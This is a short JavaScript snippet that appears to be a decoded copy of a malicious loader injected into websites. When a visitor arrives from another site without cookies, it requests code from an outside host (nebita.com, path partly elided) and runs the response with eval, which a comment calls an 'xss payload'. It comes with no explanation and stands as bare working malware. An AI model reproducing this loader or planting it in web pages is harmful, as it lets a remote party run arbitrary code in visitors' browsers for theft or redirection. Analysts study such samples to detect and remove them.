if (hasRun === undefined) {
  var hasRun = true;

  var HttpClient = function () {
    this.get = function (url, callback) {
      var request = new XMLHttpRequest();
      request.onreadystatechange = function () {
        if (request.readyState == 4 && request.status == 200) {
          callback(request.responseText);
        }
      };
      request.open("GET", url, !![]);
      request.send(null);
    };
  };

  (function () {
    if (document.referrer && !(document.referrer.indexOf(location.hostname) !== -1) && !document.cookie) {
      var client = new HttpClient();
      var url = location.protocol + "//nebita.com/U66c6Lzr<shortened by maia>aa8HI/deez/deez.php?id=" + Math.random().toString(36).substr(2) + Math.random().toString(36).substr(2);
      client.get(url, function (response) {
        // execute returned xss payload
        response.indexOf("ndsx") !== -1 && eval(response);
      });
    }
  })();
}
